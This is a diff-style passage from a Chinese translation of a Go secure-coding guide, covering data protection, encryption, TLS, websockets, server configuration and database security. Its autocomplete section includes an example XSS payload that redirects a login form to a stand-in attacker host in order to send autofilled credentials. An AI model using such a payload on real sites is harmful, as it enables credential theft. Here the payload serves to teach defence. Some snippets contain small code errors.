+</code></pre>
+
+<p>如果web应用程序使用你的api_key从第三方网站获取信息，那么如果有人在监听你的网络，那么这些信息可能会被窃取。这是因为不使用HTTPS和使用GET方法传递参数。</p>
+<p>此外，如果你的web应用程序有指向示例站点的链接：
+<code>http://mycompany.com/api/mytoken?api_key=000s3cr3t000</code>
+它将存储在你的浏览器历史记录中，因此，它也可能被窃取。</p>
+<p>解决方案是，应该始终使用HTTPS。此外，尝试使用POST方法传递参数，如果可能的话，只使用一次性的session id或token。</p>
+<h4 id="_32">信息就是力量</h4>
+<p>你应该始终删除生产环境上的应用程序和系统文档。有些文档可能会公开一些版本或功能(例如Readme、Changelog等)，这些功能可以被用来攻击web应用程序。</p>
+<p>作为开发人员，你应该允许用户删除不再使用的敏感信息。假设用户帐户上的信用卡过期了，想要删除它们 — web应用程序应该允许这样做。</p>
+<p>所有不再需要的信息必须从应用程序中删除。</p>
+<h4 id="_33">加密是关键</h4>
+<p>web应用程序中，每个高度敏感的信息都应该加密。使用Go中提供的<a href="https://godoc.org/golang.org/x/crypto">军用级加密</a>；有关更多信息，请参见<a href="https://checkmarx.gitbooks.io/go-scp/cryptographic-practices/">加密实践</a>部分。</p>
+<p>如果需要在其他地方执行的的代码，那么只需编译并共享二进制文件 — 没有可靠的解决方案来防止逆向工程。</p>
+<p>获得访问代码的不同权限并限制源代码的访问是最好的方法。</p>
+<p>不要在客户端以明文或任何非加密安全的方式存储密码、连接字符串(参见“<a href="https://checkmarx.gitbooks.io/go-scp/database-security/">数据安全</a>
+部分，如何保护数据库连接字符串的示例”一节)或其他敏感信息。这些敏感信息还包括以不安全的格式嵌入的内容（如Adobe flash或已编译的代码）。</p>
+<p>go中，使用外部包<code>golang.org/x/crypto/nacl/secretboxin</code>进行加密的小例子：</p>
+<pre><code class="go">// Load your secret key from a safe place and reuse it across multiple
+// Seal calls. (Obviously don't use this example key for anything
+// real.) If you want to convert a passphrase to a key, use a suitable
+// package like bcrypt or scrypt.
+secretKeyBytes, err := hex.DecodeString(&quot;6368616e676520746869732070617373776f726420746f206120736563726574&quot;)
+if err != nil {
+    panic(err)
+}
+
+var secretKey [32]byte
+copy(secretKey[:], secretKeyBytes)
+
+// You must use a different nonce for each message you encrypt with the
+// same key. Since the nonce here is 192 bits long, a random value
+// provides a sufficiently small probability of repeats.
+var nonce [24]byte
+if _, err := rand.Read(nonce[:]); err != nil {
+    panic(err)
+}
+
+// This encrypts &quot;hello world&quot; and appends the result to the nonce.
+encrypted := secretbox.Seal(nonce[:], []byte(&quot;hello world&quot;), &amp;nonce, &amp;secretKey)
+
+// When you decrypt, you must use the same nonce and key you used to
+// encrypt the message. One way to achieve this is to store the nonce
+// alongside the encrypted message. Above, we stored the nonce in the first
+// 24 bytes of the encrypted text.
+var decryptNonce [24]byte
+copy(decryptNonce[:], encrypted[:24])
+decrypted, ok := secretbox.Open([]byte{}, encrypted[24:], &amp;decryptNonce, &amp;secretKey)
+if !ok {
+    panic(&quot;decryption error&quot;)
+}
+
+fmt.Println(string(decrypted))
+</code></pre>
+
+<p>输出：</p>
+<pre><code class="go">hello world
+</code></pre>
+
+<h3 id="_34">禁用不需要的内容</h3>
+<p>另一种简单有效的缓解攻击的方法是确保在系统中禁用任何不必要的应用程序或服务。</p>
+<h4 id="_35">自动完成</h4>
+<p>根据<a href="https://developer.mozilla.org/en-US/docs/Web/Security/Securing_your_site/Turning_off_form_autocompletion">Mozilla文档</a>，您可以在整个表单中，使用以下方法禁用自动完成功能：</p>
+<pre><code class="html">&lt;form method=&quot;post&quot; action=&quot;/form&quot; autocomplete=&quot;off&quot;&gt;
+</code></pre>
+
+<p>或特定的表单元素：</p>
+<pre><code class="html">&lt;input type=&quot;text&quot; id=&quot;cc&quot; name=&quot;cc&quot; autocomplete=&quot;off&quot;&gt;
+</code></pre>
+
+<p>这对于在登录表单上禁用自动完成功能特别有用。假设在登录页面中存在XSS向量。如果恶意用户创建了如下有效负载：</p>
+<pre><code class="go">window.setTimeout(function() {
+  document.forms[0].action = 'http://attacker_site.com';
+  document.forms[0].submit();
+}
+), 10000);
+</code></pre>
+
+<p>它将自动填充表单字段发送到<code>attacker_site.com</code>。</p>
+<h4 id="_36">缓存</h4>
+<p>页面中，包含敏感信息的缓存控制应该被禁用。
+这可以通过设置相应的header标志来实现，如下面的代码片段所示：</p>
+<pre><code class="go">w.Header().Set(&quot;Cache-Control&quot;, &quot;no-cache, no-store&quot;)
+w.Header().Set(&quot;Pragma&quot;, &quot;no-cache&quot;)
+</code></pre>
+
+<p><code>no-cache</code>告诉浏览器在使用任何缓存信息之前与服务器重新验证（防止从缓存中获取过期的资源），而不是告诉浏览器<em>不要缓存</em>。</p>
+<p>另一方面，<code>no-store</code>值实际上是 — 停止缓存!，并且不能存储请求或响应的任何部分。</p>
+<p><code>Pragma</code>头用于支持HTTP/1.0请求。</p>
+<h2 id="_37">通信安全</h2>
+<p>在讨论通信安全性时，开发人员应该确保用于通信的通道是安全的。通信类型包括服务器-客户端、服务器-数据库以及所有后端通信。这些数据必须加密，以保证数据的完整性，并防止与通信安全相关的常见攻击。如果不能保证这些通道的安全，就会发生像MITM这样的攻击，让犯罪分子拦截并读取这些通道中的流量。</p>
+<p>本节涵盖以下通讯渠道:
+- HTTP/TLS
+- Websockets</p>
+<h3 id="httptls">HTTP/TLS</h3>
+<p>TLS/SSL是一种加密协议，它允许在其他不安全的通信通道上进行加密。它最常见的用途是提供安全的HTTP通信，也称为HTTPS。该协议确保以下属性适用于通信通道:</p>
+<ul>
+<li>隐私</li>
+<li>身份验证</li>
+<li>数据完整性</li>
+</ul>
+<p>它在Go中的实现在<code>crypto/tls</code>包中。在本节中，我们将重点介绍Go的实现和用法。虽然协议设计的理论部分和它的加密实践超出了本文的范围，但是本文档的<a href="https://checkmarx.gitbooks.io/go-scp/cryptographic-practices/">加密实践</a>
+部分还是提供了更多信息。</p>
+<p>以下是使用TLS的HTTP的简单示例：</p>
+<pre><code class="go">import &quot;log&quot;
+import &quot;net/http&quot;
+
+func main() {
+  http.HandleFunc(&quot;/&quot;, func (w http.ResponseWriter, req *http.Request) {
+    w.Write([]byte(&quot;This is an example server.\n&quot;))
+  })
+
+  // yourCert.pem - path to your server certificate in PEM format
+  // yourKey.pem -  path to your server private key in PEM format
+  log.Fatal(http.ListenAndServeTLS(&quot;:443&quot;, &quot;yourCert.pem&quot;, &quot;yourKey.pem&quot;, nil))
+}
+</code></pre>
+
+<p>这是一个，在用Go实现的web服务器中，简单的开箱即用的SSL实现。值得注意的是，这个示例在SSL实验室中获得了“A”。</p>
+<p>为了进一步提高通信安全，可以在header中添加以下标志，以强制执行HSTS (HTTP严格传输安全)：</p>
+<pre><code class="go">w.Header().Add(&quot;Strict-Transport-Security&quot;, &quot;max-age=63072000; includeSubDomains&quot;)
+</code></pre>
+
+<p>Go的TLS实现在crypto/ TLS包中。在使用TLS时，请确保使用了单个标准TLS实现，并对其进行了适当的配置。</p>
+<p>基于前面的例子实现SNI（Server Name Indication）：</p>
+<pre><code class="go">...
+type Certificates struct {
+    CertFile    string
+    KeyFile     string
+}
+
+func main() {
+    httpsServer := &amp;http.Server{
+        Addr: &quot;:8080&quot;,
+    }
+
+    var certs []Certificates
+    certs = append(certs, Certificates{
+        CertFile: &quot;../etc/yourSite.pem&quot;, //Your site certificate key
+        KeyFile:  &quot;../etc/yourSite.key&quot;, //Your site private key
+    })
+
+    config := &amp;tls.Config{}
+    var err error
+    config.Certificates = make([]tls.Certificate, len(certs))
+    for i, v := range certs {
+        config.Certificates[i], err = tls.LoadX509KeyPair(v.CertFile, v.KeyFile)
+    }
+
+    conn, err := net.Listen(&quot;tcp&quot;, &quot;:8080&quot;)
+
+    tlsListener := tls.NewListener(conn, config)
+    httpsServer.Serve(tlsListener)
+    fmt.Println(&quot;Listening on port 8080...&quot;)
+}
+</code></pre>
+
+<p>需要注意的是，在使用TLS时，证书应该是有效的，拥有正确的域名，不应该过期，并且应该在需要时安装中间证书，如<a href="https://www.owasp.org/images/0/08/OWASP_SCP_Quick_Reference_Guide_v2.pdf">OWASP SCP快速参考指南</a>所建议的那样。</p>
+<p><strong>重要提示</strong>：无效的TLS证书应该始终被拒绝。确保在生产环境中，没有将InsecureSkipVerify配置设置为true。</p>
+<p>以下代码段是如何设置的示例：</p>
+<pre><code class="go">config := &amp;tls.Config{InsecureSkipVerify: false}
+</code></pre>
+
+<p>使用正确的主机名以设置服务器名称：</p>
+<pre><code class="go">config := &amp;tls.Config{ServerName: &quot;yourHostname&quot;}
+</code></pre>
+
+<p>另一种已知的TLS攻击被称为POODLE。 当客户端不支持服务器的密码时，它与TLS连接回退有关。 这允许将连接降级为易受攻击的密码。</p>
+<p>默认情况下，Go禁用SSLv3，可以使用以下配置，来设置密码的最小版本和最大版本：</p>
+<pre><code>// MinVersion contains the minimum SSL/TLS version that is acceptable.
+// If zero, then TLS 1.0 is taken as the minimum.
+  MinVersion uint16
+
+// MaxVersion contains the maximum SSL/TLS version that is acceptable.
+// If zero, then the maximum version supported by this package is used,
+// which is currently TLS 1.2.
+  MaxVersion uint16
+</code></pre>
+
+<p>可以通过<a href="https://www.ssllabs.com/">SSL实验室</a>，来检查，使用的密码的安全性。</p>
+<p>一个通常用于减轻降级攻击的附加标志，是RFC7507中定义的TLS_FALLBACK_SCSV。 在Go中，没有回退。</p>
+<p>引用Google开发者Adam Langley的话：</p>
+<blockquote>
+<p>Go客户端不执行回退，因此不需要发送TLS_FALLBACK_SCSV。</p>
+</blockquote>
+<p>另一种称为CRIME的攻击会影响使用压缩的TLS会话。 压缩是核心协议的一部分，但它是可选的。用Go语言编写的程序可能并不容易受到攻击，原因很简单，因为目前<code>crypto/tls</code>不支持压缩机制。一个需要记住的重要注意事项是，如果Go包装器用于外部安全库，应用程序可能很容易受到攻击。</p>
+<p>TLS的另一部分与重新协商连接有关。为了确保没有建立不安全的连接，请使用<code>GetClientCertificate</code>及其相关的错误代码，以防握手终止。可以捕获错误代码以防止使用不安全的通道。</p>
+<p>所有请求也应编码为预定的字符编码，例如UTF-8。 这可以在header中设置：</p>
+<pre><code class="go">w.Header().Set(&quot;Content-Type&quot;, &quot;Desired Content Type; charset=utf-8&quot;)
+</code></pre>
+
+<p>处理HTTP连接时的另一个重要方面是，验证HTTP头在访问外部站点时，不包含任何敏感信息。既然连接可能不安全，那么HTTP报头就可能泄漏信息。</p>
+<p><img alt="InsecureHeader.png" src="https://checkmarx.gitbooks.io/go-scp/communication-security/img/InsecureHeader.png" /></p>
+<h3 id="websockets">Websockets</h3>
+<p>WebSocket是为HTML 5开发的一种新的浏览器功能，它支持完全交互式应用程序。使用WebSockets，浏览器和服务器都可以通过一个TCP套接字发送异步消息，而无需使用长轮询或短轮训。</p>
+<p>本质上，WebSocket是客户机和服务器之间的标准双向TCP套接字。这个套接字以常规HTTP连接开始，然后在HTTP握手之后“升级”为TCP套接字。任何一方都可以在握手之后发送数据。</p>
+<h4 id="origin-header">Origin header</h4>
+<p>HTTP Websocket握手中的<code>Origin</code> header用于确保Websocket接受的连接来自可信的原始域。执行失败可能导致跨站点请求伪造(CSRF)。</p>
+<p>服务器负责在初始HTTP WebSocket握手中验证Origin头。 如果服务器未在初始WebSocket握手中验证原始header，则WebSocket服务器可能接受来自任何源的连接。</p>
+<p>以下示例使用Origin头检查，以防止攻击者执行CSWSH（跨站点WebSocket劫持）。</p>
+<p><img alt="w1_1.png" src="https://checkmarx.gitbooks.io/go-scp/communication-security/img/w1_1.png" /></p>
+<p>应用程序应该验证<code>Host</code>和<code>Origin</code>，以确保请求的<code>Origin</code>是可信任的<code>Origin</code>，否则拒绝连接。</p>
+<p>下面的代码片段演示了一个简单的检查：</p>
+<pre><code class="go">//Compare our origin with Host and act accordingly
+if r.Header.Get(&quot;Origin&quot;) != &quot;http://&quot;+r.Host {
+  http.Error(w, &quot;Origin not allowed&quot;, 403)
+    return
+} else {
+    websocket.Handler(EchoHandler).ServeHTTP(w, r)
+}
+</code></pre>
+
+<h4 id="_38">机密性和完整性</h4>
+<p>Websocket通信通道可以通过未加密的TCP或加密的TLS建立。</p>
+<p>当使用未加密的Websockets时，<code>URI scheme</code>是<code>ws://</code>，其默认端口是<code>80</code>。如果使用TLS Websockets, <code>URI scheme</code>是<code>wss://</code>，默认端口是<code>443</code>。</p>
+<p>涉及到Websockets时，无论是使用TLS方式还是用未加密方式，我们必须考虑原始连接。</p>
+<p>在本节中，我们将展示连接从HTTP升级到Websocket时发送的信息，以及如果处理不当所带来的风险。在第一个示例中，我们看到常规HTTP连接正在升级到Websocket连接：</p>
+<p><img alt="w2_1.png" src="https://checkmarx.gitbooks.io/go-scp/communication-security/img/w2_1.png" /></p>
+<p>注意，请求头包含此次会话的cookie。为确保不泄漏敏感信息，升级连接时应该使用TLS。如下图所示：</p>
+<p><img alt="ws_tls_upgrade.png" src="https://checkmarx.gitbooks.io/go-scp/communication-security/img/ws_tls_upgrade.png" /></p>
+<p>在后一个例子中，和Websocket一样，我们的连接升级请求使用SSL：</p>
+<p><img alt="" src="https://checkmarx.gitbooks.io/go-scp/communication-security/img/wss_secure.png" /></p>
+<h4 id="_39">认证和授权</h4>
+<p>Websockets不处理认证或授权，这意味着必须使用诸如cookie、HTTP身份验证或TLS身份验证等机制来确保安全性。有关这方面的更详细信息，请参阅本文档的“<a href="https://checkmarx.gitbooks.io/go-scp/authentication-password-management/">身份验证</a>”和“<a href="https://checkmarx.gitbooks.io/go-scp/access-control/">访问控制</a>”部分。</p>
+<h4 id="_40">输入数据清理</h4>
+<p>与来自不可信源的任何数据一样，应该对数据进行适当的清理和编码。有关这些主题的更详细内容，请参阅本文档的“<a href="https://checkmarx.gitbooks.io/go-scp/input-validation/sanitization.html">数据清理</a>”和“<a href="https://checkmarx.gitbooks.io/go-scp/output-encoding/">输出编码</a>”部分。</p>
+<h2 id="_41">系统配置</h2>
+<p>保持更新是安全的关键。因此，开发人员应该将Go更新到最新版本，包括Web应用程序中使用的外部包和框架。</p>
+<p>关于Go中的HTTP请求，你需要知道任何传入服务器的请求都是使用HTTP/1.1或HTTP/2来完成的。如果请求是：</p>
+<pre><code class="go">req, _ := http.NewRequest(&quot;POST&quot;, url, buffer)
+req.Proto = &quot;HTTP/1.0&quot;
+</code></pre>
+
+<p><code>Proto</code> 将被忽略，请求会使用HTTP/1.1发出。</p>
+<h3 id="_42">目录列表</h3>
+<p>如果开发人员忘记禁用目录列表（OWASP也称其为目录索引），攻击者可以通过目录导航出一些敏感文件。</p>
+<p>如果你运行一个Go Web服务器应用程序，你还应该小心：</p>
+<pre><code class="go">http.ListenAndServe(&quot;:8080&quot;, http.FileServer(http.Dir(&quot;/tmp/static&quot;)))
+</code></pre>
+
+<p>如果你访问<code>localhost:8080</code>，它将打开你的index.html。但是假设你有一个测试目录<code>localhost:8080/test/</code>，内部有敏感文件：</p>
+<p><img alt="index_file.png" src="https://checkmarx.gitbooks.io/go-scp/system-configuration/files/index_file.png" /></p>
+<p>为什么会这样？ Go尝试在目录中找到index.html，如果它不存在，它将显示目录列表。</p>
+<p>要解决这个问题，有三个可行的解决方案:</p>
+<ul>
+<li>在你的web应用程序中禁用目录列表</li>
+<li>限制对不必要的目录和文件的访问</li>
+<li>为每个目录创建一个索引文件</li>
+</ul>
+<p>这里我们将描述一种禁用目录列表的方法，首先，创建一个函数来检查所请求的路径，以及是否可以显示该路径。</p>
+<pre><code class="go">type justFilesFilesystem struct {
+    fs http.FileSystem
+}
+
+func (fs justFilesFilesystem) Open(name string) (http.File, error) {
+    f, err := fs.fs.Open(name)
+    if err != nil {
+        return nil, err
+    }
+    return neuteredReaddirFile{f}, nil
+}
+</code></pre>
+
+<p>然后我们在<code>http.ListenAndServe</code>中使用它：</p>
+<pre><code class="go">fs := justFilesFilesystem{http.Dir(&quot;tmp/static/&quot;)}
+http.ListenAndServe(&quot;:8080&quot;, http.StripPrefix(&quot;/tmp/static&quot;, http.FileServer(fs)))
+</code></pre>
+
+<p>请注意，我们的应用程序仅允许显示<code>tmp/static</code>路径。当我们试图直接访问受保护的文件，我们得到：</p>
+<p><img alt="safe.png" src="https://checkmarx.gitbooks.io/go-scp/system-configuration/files/safe.png" /></p>
+<p>如果我们尝试获取<code>test/</code>目录列表，我们将得到相同的错误</p>
+<p><img alt="safe2.png" src="https://checkmarx.gitbooks.io/go-scp/system-configuration/files/safe2.png" /></p>
+<h3 id="_43">删除/禁用你不需要的内容</h3>
+<p>在生产环境中，删除所有不需要的功能点和文件。测试代码和函数，只应该留在开发人员层，而不是每个人都能看到的位置。最终版本 (准备上生产的版本) 不需要任何测试代码和函数。</p>
+<p>我们还应该检查HTTP响应头。删除响应头中暴露的敏感信息，例如:</p>
+<ul>
+<li>操作系统版本</li>
+<li>Webserver版本</li>
+<li>框架或编程语言版本</li>
+</ul>
+<p><img alt="headers_set_versions.jpg" src="https://checkmarx.gitbooks.io/go-scp/system-configuration/files/headers_set_versions.jpg" /></p>
+<p>攻击者可以使用这些信息来检查你公开的版本中的漏洞，因此建议删除它们。
+默认情况下，Go不会公开这些内容。但是，如果你使用任何类型的外部包或框架，不要忘记仔细检查。</p>
+<p>类似这样的：</p>
+<pre><code class="go">w.Header().Set(&quot;X-Request-With&quot;, &quot;Go Vulnerable Framework 1.2&quot;)
+</code></pre>
+
+<p>在代码中搜索，暴露的HTTP头的代码，然后删除它。</p>
+<p>你还可以在web应用程序中定义支持哪些HTTP方法。如果应用程序只接受<code>POST</code>和<code>GET</code>请求，使用以下代码实现CORS：</p>
+<pre><code class="go">w.Header().Set(&quot;Access-Control-Allow-Methods&quot;, &quot;POST, GET&quot;)
+</code></pre>
+
+<p>不要担心禁用WebDAV之类的东西，因为如果要实现WebDAV服务器，需要导入一个<a href="[https://godoc.org/golang.org/x/net/webdav](https://godoc.org/golang.org/x/net/webdav)">包</a>。</p>
+<h3 id="_44">实现更好的安全性</h3>
+<p>调整好心态，然后遵循Web服务器，流程和服务帐户上的<a href="[https://www.owasp.org/index.php/Least_privilege](https://www.owasp.org/index.php/Least_privilege)">最小权限原则</a>。</p>
+<p>关注web应用程序中的错误处理。发生异常时，安全地处理错误。 你可以查看本指南中的<a href="[https://www.giac.org/paper/gsec/2693/implementation-methodology-information-security-management-system-to-comply-bs-7799-requi/104600">错误处理</a>](https://www.giac.org/paper/gsec/2693/implementation-methodology-information-security-management-system-to-comply-bs-7799-requi/104600))
+)和<a href="[https://www.sans.org/security-resources/policies/server-security#information-logging-standard](https://www.sans.org/security-resources/policies/server-security#information-logging-standard)">日志记录</a>部分，以获取有关此主题的更多信息。</p>
+<p>防止在<code>robots.txt</code>文件中暴露目录结构。robots.txt是一个方向文件，而不是一个安全控件。 采用白名单方法：</p>
+<pre><code class="html">User-agent: *
+Allow: /sitemap.xml
+Allow: /index
+Allow: /contact
+Allow: /aboutus
+Disallow: /
+</code></pre>
+
+<p>上面的示例将允许任何用户代理或机器人索引这些特定页面，并禁止其余页面。 这样就不会泄露敏感文件夹或页面 - 例如管理路径或其他重要数据。</p>
+<p>将开发环境与生产环境的网络隔离开来。为开发人员和测试组，提供正确的访问权限，更好的是创建额外的安全层来保护它们。在大多数情况下，开发环境更容易成为攻击的目标。</p>
+<p>最后，但仍然非常重要的是，要有一个软件更改控制系统来管理和记录Web应用程序代码（开发和生产环境）中的更改。有许多在你自己主机上搭建类似Github的克隆可以用于此目的。</p>
+<h3 id="_45">资产管理系统：</h3>
+<p>虽然资产管理系统不是Go特定的问题，但以下部分将简要概述该概念及其实践。</p>
+<p>资产管理包括组织执行的一系列活动，以便根据组织目标实现资产的最佳配置，以及对每项资产所需安全级别的评估。应该注意的是，在本节中，当我们提到资产时，我们不仅讨论系统的组件，而且还讨论软件。</p>
+<p>实施该系统涉及的步骤如下：</p>
+<pre><code>1. 确定信息安全在企业中的重要性。
+2. 定义AMS的范围。
+3. 定义安全策略。
+4. 建立安全组织结构。
+5. 识别和分类资产。
+6. 识别和评估风险。
+7. 规划风险管理。
+8. 实施风险缓解策略。
+9. 写下适用性声明。
+10. 培训员工并树立安全意识。
+11. 监控并查看AMS性能。
+12. 维护AMS并确保持续改进。
+</code></pre>
+
+<p>可以在<a href="https://www.giac.org/paper/gsec/2693/implementation-methodology-information-security-management-system-to-comply-bs-7799-requi/104600">此处</a>找到对此实现更深入的分析。</p>
+<h2 id="_46">数据库安全</h2>
+<p>关于OWASP SCP的这一节，将讨论开发人员和DBA，在web应用程序中使用数据库时，需要采取的所有数据库安全问题和操作。</p>
+<p>Go没有数据库驱动程序，而是在<a href="https://golang.org/pkg/database/sql/">database/sql</a>包上有一个核心接口驱动程序。这意味着在使用数据库连接时需要注册SQL驱动程序(例如:<a href="https://github.com/go-sql-driver/mysql">MariaDB</a>、<a href="https://github.com/mattn/go-sqlite3">sqlite3</a>)。</p>
+<h4 id="_47">最佳实践</h4>
+<p>在Go中实现数据库之前，您应该注意下面我们将讨论的一些配置：</p>
+<ul>
+<li>安全数据库安装</li>
+</ul>
+<pre><code>更改/设置root账户的密码；
+删除本地主机外部可访问的root帐户；
+删除任何匿名用户帐户；
+删除任何现有的测试数据库；
+</code></pre>
+
+<ul>
+<li>删除任何不必要的存储过程、实用程序包、不必要的服务、vendor内容(例如示例模式)。</li>
+<li>安装数据库与Go一起使用所需的最少功能和选项集。</li>
+<li>禁用web应用程序上不需要连接到数据库的任何默认帐户。</li>
+</ul>
+<p>另外，由于验证数据库上的输入和编码输出非常重要，所以请务必阅读本指南的<a href="https://checkmarx.gitbooks.io/go-scp/input-validation/">输入验证</a>
+和<a href="https://checkmarx.gitbooks.io/go-scp/output-encoding/">输出编码</a>部分。</p>
+<p>在使用数据库时，这基本上可以适用于任何编程语言。</p>
+<h3 id="_48">数据库连接</h3>
+<h4 id="_49">概念</h4>
+<p><code>sql.Open</code>不返回数据库连接，而是返回<code>*DB</code>：数据库连接池。当运行一个数据库操作（例如查询）时，从池中取出一个可用连接，该连接应该在操作完成后立即返回到连接池中。</p>
+<p>请记住，仅在首次执行数据库操作（如查询）时才会打开一个数据库连接。<code>sql.Open</code>并不会测试数据库连接：数据库凭据错误，要在第一个数据库操作执行时才会触发。</p>
+<p>根据经验，应该始终使用<code>database/sql</code>接口的上下文变体(例如QueryContext())，并提供适当的<a href="[https://golang.org/pkg/context/](https://golang.org/pkg/context/)">上下文</a>。</p>
+<p>来自Go官方文档：“Package上下文定义了Context类型，它跨API边界和进程之间传递截止日期，取消信号和其他请求范围的值。” 在数据库级别，当上下文被取消时，如果没有提交事务，将回滚事务，rows(来自QueryContext)将被关闭，并返回所有资源。</p>
+<pre><code class="go">package main
+
+import (
+    &quot;context&quot;
+    &quot;database/sql&quot;
+    &quot;fmt&quot;
+    &quot;log&quot;
+    &quot;time&quot;
+
+    _ &quot;github.com/go-sql-driver/mysql&quot;
+)
+
+type program struct {
+    base context.Context
+    cancel func()
+    db *sql.DB
+}
+
+func main() {
+    db, err := sql.Open(&quot;mysql&quot;, &quot;user:@/cxdb&quot;)
+    if err != nil {
+        log.Fatal(err)
+    }
+    p := &amp;program{db: db}
+    p.base, p.cancel = context.WithCancel(context.Background())
+
+    // Wait for program termination request, cancel base context on request.
+    go func() {
+        osSignal := // ...
+        select {
+        case &lt;-p.base.Done():
+        case &lt;-osSignal:
+            p.cancel()
+        }
+        // Optionally wait for N milliseconds before calling os.Exit.
+    }()
+
+    err =  p.doOperation()
+    if err != nil {
+        log.Fatal(err)
+    }
+}
+
+func (p *program) doOperation() error {
+    ctx, cancel := context.WithTimeout(p.base, 10 * time.Second)
+    defer cancel()
+
+    var version string
+    err := p.db.QueryRowContext(ctx, &quot;SELECT VERSION();&quot;).Scan(&amp;version)
+    if err != nil {
+        return fmt.Errorf(&quot;unable to read version %v&quot;, err)
+    }
+    fmt.Println(&quot;Connected to:&quot;, version)
+}
+</code></pre>
+
+<h4 id="_50">连接字符串的保护</h4>
+<p>为了保证连接字符串的安全性，最好将身份验证细节放在公共访问之外的独立配置文件中。</p>
+<p>不要将配置文件放在<code>/home/public_html/</code>中，而是考虑放在<code>/home/private/configdb.xml</code>中(受保护的区域)</p>
+<pre><code class="xml">&lt;connectionDB&gt;
+  &lt;serverDB&gt;localhost&lt;/serverDB&gt;
+  &lt;userDB&gt;f00&lt;/userDB&gt;
+  &lt;passDB&gt;f00?bar#ItsP0ssible&lt;/passDB&gt;
+&lt;/connectionDB&gt;
+</code></pre>
+
+<p>然后你可以在Go文件中调用config.xml文件：</p>
+<pre><code class="xml">configFile, _ := os.Open(&quot;../private/configDB.xml&quot;)
+</code></pre>
+
+<p>读取文件后，连接数据库：</p>
+<pre><code class="xml">db, _ := sql.Open(serverDB, userDB, passDB)
+</code></pre>
+
+<p>当然，如果攻击者具有root访问权限，他就可以看到该文件。这就引出了你能做的最谨慎的事情--加密文件。</p>
+<h4 id="_51">数据库证书</h4>
+<p>你应该为每个信任区块和级别使用不同的凭据:</p>
+<ul>
+<li>用户</li>
+<li>只读用户</li>
+<li>客人</li>
+<li>管理</li>
+</ul>
+<p>这样，如果连接是为只读用户建立的，他们就永远不会破坏数据库信息，因为这些用户实际上只能读取数据。</p>
+<h3 id="_52">数据库认证</h3>
+<h4 id="_53">以最小权限访问数据库</h4>
+<p>如果您的Go web应用程序只需要读取数据而不需要写入信息，那么创建一个权限为只读的数据库用户。始终根据web应用程序的需要调整数据库用户。</p>
+<h4 id="_54">使用强密码</h4>
+<p>创建数据库访问权限时，请选择强密码。您可以使用密码管理器来生成强密码，或者使用为你执行相同操作的在线Web应用程序 - <a href="https://strongpasswordgenerator.com/">强密码生成器</a>。</p>
+<h4 id="_55">删除默认的管理密码</h4>
+<p>大多数DBS都有默认帐户，其中大部分都没有最高权限用户的密码。
+MariaDB，MongoDB  -  root /无密码</p>
+<p>这意味着如果没有密码，攻击者就可以访问所有内容。</p>
+<p>此外，如果你要将代码发布在Github的可公开访问的存储库中，请不要忘记删除您的凭据或私钥。</p>
+<h3 id="_56">参数化查询</h3>
+<p>预先准备好的查询语句(带有参数化查询)是防止SQL注入的最佳和最安全的方法。</p>
+<p>在某些报告的情况下，预先准备好的语句可能会有损web应用程序的性能。因此，如果出于某种原因需要停止使用这种类型的数据库查询，我们强烈建议阅读<a href="https://checkmarx.gitbooks.io/go-scp/input-validation/">输入验证</a>和<a href="https://checkmarx.gitbooks.io/go-scp/output-encoding/">输出编码</a>部分。</p>
+<p>Go与其他语言的常用预准备语句的工作方式不同 - 你不需要在连接上准备语句， 而在DB上准备。</p>
+<h3 id="_57">示例</h3>
+<ul>
+<li>开发人员在连接池中的一个连接上准备语句(Stmt)</li>
+<li>Stmt对象会记住使用了哪个连接</li>
+<li>当应用程序执行Stmt时，它尝试使用该连接。如果它不可用，它将尝试在池中找到另一个连接</li>
+</ul>
+<p>这种类型的流可能导致数据库的高并发性使用，并创建大量预准备的语句。所以，记住这些信息非常重要。</p>
+<p>以下是带参数化查询的预准备语句的示例：</p>
+<pre><code class="go">customerName := r.URL.Query().Get(&quot;name&quot;)
+db.Exec(&quot;UPDATE creditcards SET name=? WHERE customerId=?&quot;, customerName, 233, 90)
+</code></pre>
+
+<p>有时候，准备好的语句不是你想要的。这可能有几个原因：</p>
+<ul>
+<li>数据库不支持预准备语句。例如，在使用MySQL驱动程序时，可以连接到MemSQL和Sphinx，因为它们支持MySQL 有线协议。但是它们不支持包含预准备语句的“二进制”协议，因此它们可能会以令人困惑的方式失败。</li>
+<li>这些语句的重用性不足以使它们变得有价值，并且安全问题在我们的应用程序堆栈的另一层处理（请参阅：<a href="https://checkmarx.gitbooks.io/go-scp/input-validation/">输入验证</a>和<a href="https://checkmarx.gitbooks.io/go-scp/output-encoding/">输出编码</a>，因此上面所示的性能是不可取的。</li>
+</ul>
+<h3 id="_58">存储过程</h3>
+<p>开发人员可以使用存储过程创建查询的特定视图，以防止敏感信息被归档，而不是使用普通查询。</p>
+<p>开发人员可以添加一个接口，通过创建和限制对存储过程的访问，将一个人使用特定存储过程和可以访问的信息类型区分开来。使用此功能，开发人员可以更容易地管理该过程，特别是在从安全角度控制表和列时，非常方便。</p>
+<p>让我们来看一个例子……</p>
+<p>假设你有一个表，其中包含关于用户护照ID的信息。</p>
+<p>使用如下查询:</p>
+<pre><code class="sql">SELECT * FROM tblUsers WHERE userId = $user_input
+</code></pre>
+
+<p>除了输入验证的问题之外，数据库用户(在本例中，用户名为John)还可以通过用户ID访问所有信息。</p>
+<p>如果John只能使用这个存储过程会怎样：</p>
+<pre><code class="sql">CREATE PROCEDURE db.getName @userId int = NULL
+AS
+    SELECT name, lastname FROM tblUsers WHERE userId = @userId
+GO
+</code></pre>
+
+<p>你只需使用以下命令即可运行：</p>
+<pre><code class="sql">EXEC db.getName @userId = 14
+</code></pre>
+
+<p>通过这种方式，你可以确定用户John只看到他请求的用户的<code>name</code>和<code>lastname</code>。</p>
+<p>存储过程并不是无懈可击的，但是它为你的web应用程序创建了一个新的保护层。存储过程为DBA在控制权限方面提供了很大的优势(例如，用户可以限于特定的行/数据)，甚至更好的服务器性能。</p>
+<h2 id="_59">文件管理</h2>
+<p>处理文件时要采取的第一个预防措施是，确保不允许用户直接向任何动态函数提供数据。在PHP等语言中，将用户数据传递给动态加载函数是一个严重的安全风险。Go是一种编译语言，这意味着不会<code>include</code>函数，而且通常不会动态加载库。</p>
+<blockquote>
+<p>Go 1.8版本，允许通过新的插件机制来实现动态加载。如果你的应用程序使用这种机制，应该对用户提供的输入采取预防措施。</p>
+</blockquote>
